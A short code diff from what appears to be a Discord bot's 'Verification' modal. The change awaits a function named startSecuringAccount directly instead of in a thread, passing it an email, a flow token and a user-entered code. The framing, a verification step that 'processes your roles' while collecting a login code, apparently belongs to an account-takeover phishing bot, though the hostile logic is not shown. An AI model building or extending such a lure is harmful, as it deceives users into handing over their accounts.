@@ -47,7 +47,7 @@ class MyModalTwo(ui.Modal, title="Verification"):
             "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
         )
 
-        finalEmbeds = await asyncio.to_thread(startSecuringAccount, self.email, self.flowtoken, self.box_three.value)
+        finalEmbeds = await startSecuringAccount(self.email, self.flowtoken, self.box_three.value)
         
         if not finalEmbeds:
 
